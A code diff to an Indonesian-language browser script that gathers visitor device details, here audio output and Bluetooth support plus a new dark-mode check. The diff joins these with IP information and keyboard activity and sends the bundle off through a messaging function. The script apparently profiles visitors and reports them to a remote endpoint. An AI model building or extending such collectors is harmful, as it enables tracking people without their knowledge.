@@ -538,17 +538,15 @@ Gamepad Terhubung     : ${gamepad}
 const ambilOutputAudio = async () => {
   let sinkSupport = 'Tidak didukung';
   let bluetoothStatus = 'Tidak terdeteksi';
-  let headset = 'Tidak terdeteksi';
 
-  // Deteksi Audio Sink
   try {
     const audio = document.createElement("audio");
     sinkSupport = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak didukung";
   } catch {}
 
-  // Deteksi Bluetooth
   try {
     if (navigator.bluetooth) {
+      // Cek apakah permission sudah pernah diminta sebelumnya
       const status = await navigator.permissions.query({ name: "bluetooth" }).catch(() => {});
       bluetoothStatus = status?.state === "granted" ? "Terhubung" : "Tidak terhubung";
     } else {
@@ -558,18 +556,21 @@ const ambilOutputAudio = async () => {
     bluetoothStatus = "Tidak terdeteksi";
   }
 
-  // Deteksi Headset
-  try {
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const outputDevices = devices.filter(d => d.kind === "audiooutput");
-    headset = outputDevices.length > 1 ? "Ya" : "Tidak";
-  } catch {}
-
   return `
-౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 & 𝗘𝗞𝗦𝗧𝗘𝗥𝗡𝗔𝗟 〙 ౼
+౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 〙 ౼
 Audio Output Sink      : ${sinkSupport}
 Bluetooth              : ${bluetoothStatus}
-Headset Terdeteksi     : ${headset}
+`.trim();
+};
+
+const ambilKecerahanMode = () => {
+  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
+  const preferensi = darkMode === 'Ya' ? 'dark' : 'light';
+
+  return `
+౼ 〘 𝗞𝗘𝗖𝗘𝗥𝗔𝗛𝗔𝗡 & 𝗠𝗢𝗗𝗘 〙 ౼
+Mode Gelap Aktif       : ${darkMode}
+Preferensi Warna       : ${preferensi}
 `.trim();
 };
 
@@ -653,7 +654,8 @@ const mulai = async () => {
   // Fitur tambahan
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio(); // ✅ Tambah di sini
+  const outputAudio = await ambilOutputAudio();
+  const kecerahanMode = ambilKecerahanMode(); // ✅ Tambah di sini
 
   const gabungAwal = [
     infoPerangkat,
@@ -665,7 +667,8 @@ const mulai = async () => {
     ipInfo,
     keyboard,
     perangkatEksternal,
-    outputAudio                // ✅ Tambah ke array ini
+    outputAudio,
+    kecerahanMode // ✅ Tambahkan di sini
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
